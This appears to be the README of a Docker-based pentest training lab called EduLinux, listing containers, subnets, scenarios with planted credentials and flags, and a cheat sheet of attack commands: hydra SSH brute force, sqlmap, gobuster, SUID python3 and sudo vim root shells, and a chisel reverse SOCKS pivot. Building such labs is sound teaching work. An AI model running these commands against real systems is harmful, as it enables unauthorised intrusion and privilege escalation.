# EduLinux — Lab Infrastructure

Real Docker environments for hands-on pentest scenarios.

---

## Quick Start

```bash
# 1. Build and start all lab containers (from project root)
docker compose -f docker-compose.labs.yml up -d --build

# 2. Enter the attacker machine
docker exec -it lab-attacker bash

# 3. Stop all labs
docker compose -f docker-compose.labs.yml down
```

---

## Network Layout

| Network | Subnet | Purpose |
|---|---|---|
| `lab_pentest` | `172.20.0.0/24` | Attacker + external targets |
| `lab_internal` | `172.21.0.0/24` | Internal targets (pivot only, no internet) |

---

## Containers

| Container | IP | Image / Context | Purpose |
|---|---|---|---|
| `lab-attacker` | 172.20.0.2 / 172.21.0.2 | `labs/attacker` (Kali) | Shell entry point — `docker exec -it lab-attacker bash` |
| `lab-ssh-target` | 172.20.0.10 | `labs/ssh-easy` | SSH brute-force target |
| `lab-dvwa` | 172.20.0.20 | `vulnerables/web-dvwa` | DVWA web app |
| `lab-compromised` | 172.20.0.30 | `labs/compromised` | Forensic / incident response |
| `lab-web-custom` | 172.20.0.40 | `labs/web-custom` | Custom vulnerable PHP app |
| `lab-privesc` | 172.20.0.50 | `labs/privesc` | Privilege escalation |
| `lab-ghost-target` | 172.20.0.60 | `labs/web-custom` | Full red-team target |
| `lab-dmz` | 172.20.0.70 / 172.21.0.5 | `labs/dmz` | Pivot entry point (dual-homed) |
| `lab-internal` | 172.21.0.10 | `labs/internal` | Internal target (pivot required) |
| `lab-corp-web` | 172.20.0.80 | `labs/web-custom` | ULTIME corp web front-end |
| `lab-corp-internal` | 172.21.0.20 | `labs/dmz` | ULTIME corp internal server |
| `lab-corp-db` | 172.21.0.30 | `mysql:8.0` | ULTIME corp database |

---

## Scenarios

### SSH Brute Force
- Target: `lab-ssh-target` (172.20.0.10:22)
- Tool: `hydra -L /usr/share/wordlists/... -P /usr/share/wordlists/... ssh://172.20.0.10`
- Credentials to find: `admin:admin123`, `deploy:deploy2024`, `backup:backup`
- Flag: `/home/admin/flag.txt`

### Web Pentesting (lab-web-custom / lab-ghost-target)
- Target: 172.20.0.40 or 172.20.0.60
- Vectors: SQLi (`?id=`), LFI (`?file=`, `/read.php?path=`), unrestricted upload (`/upload.php`)
- Recon: check `/robots.txt`, directory-bust `/backup/`, look for `/backup/config.txt`
- Flag: `/var/www/html/flag.txt`

### DVWA
- Target: 172.20.0.20 (default credentials: `admin` / `password`)
- Covers: SQLi, XSS, CSRF, file inclusion, command injection

### Forensics / Incident Response
- Target: `lab-compromised` (172.20.0.30)
- Tasks: identify the malicious cron in `/etc/cron.d/updates`, C2 script in `/tmp/.hidden/`, attacker SSH key in `/root/.ssh/authorized_keys`, bash history in `/root/.bash_history`
- Flag: `/root/flag.txt`

### Privilege Escalation
- Entry: SSH `www-data-sim:webpass` on `lab-privesc` (172.20.0.50)
- Vectors (three paths to root):
  1. SUID python3: `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'`
  2. Sudo vim: `sudo vim -c ':!/bin/sh'`
  3. World-writable cron script: overwrite `/opt/scripts/backup.sh`
- Flag: `/root/root.txt`

### Pivot / Double Network
1. Compromise `lab-dmz` (172.20.0.70) via SSH (`www:web2024`)
2. DMZ also has 172.21.0.5 — set up a chisel tunnel or proxychains route
3. Reach `lab-internal` (172.21.0.10) through the tunnel
4. Flag: `/root/final_flag.txt`

### ULTIME Full Chain
1. Scan and attack `lab-corp-web` (172.20.0.80) — same web vulns as lab-web-custom
2. Pivot through `lab-corp-internal` (172.21.0.20)
3. Reach `lab-corp-db` (172.21.0.30) — MySQL root password `flagDB2024!`, database `corporate_data`

---

## Useful Commands (from inside lab-attacker)

```bash
# Network scan of pentest range
nmap -sV 172.20.0.0/24

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://172.20.0.10

# Web directory brute force
gobuster dir -u http://172.20.0.40 -w /usr/share/wordlists/dirb/common.txt

# SQLmap
sqlmap -u "http://172.20.0.40/?id=1" --dbs

# Pivot with chisel (server on attacker, client on DMZ)
# Attacker: chisel server -p 8888 --reverse
# DMZ:      chisel client 172.20.0.2:8888 R:socks
# Then use proxychains to reach 172.21.0.0/24
```

---

## Rebuilding a Single Container

```bash
docker compose -f docker-compose.labs.yml build lab-privesc
docker compose -f docker-compose.labs.yml up -d lab-privesc
```

## Resetting All Labs

```bash
docker compose -f docker-compose.labs.yml down -v
docker compose -f docker-compose.labs.yml up -d --build
```
